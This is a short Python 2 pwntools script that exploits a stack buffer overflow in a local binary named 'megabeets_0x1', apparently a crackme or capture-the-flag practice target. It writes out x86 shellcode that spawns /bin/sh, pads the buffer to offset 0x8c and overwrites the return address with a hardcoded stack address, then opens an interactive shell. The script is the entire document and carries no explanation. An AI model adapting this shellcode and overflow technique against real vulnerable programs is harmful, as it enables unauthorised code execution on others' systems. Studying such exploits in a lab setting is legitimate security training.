#!/usr/bin/python2
from pwn import *


off = 0x8c

sc_addr = p32(0xffffcf50)
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

buf = ''
buf += sc
buf += 'A'*(off-len(sc))
buf += str(sc_addr)


tar = process(['./megabeets_0x1', buf])

tar.interactive()
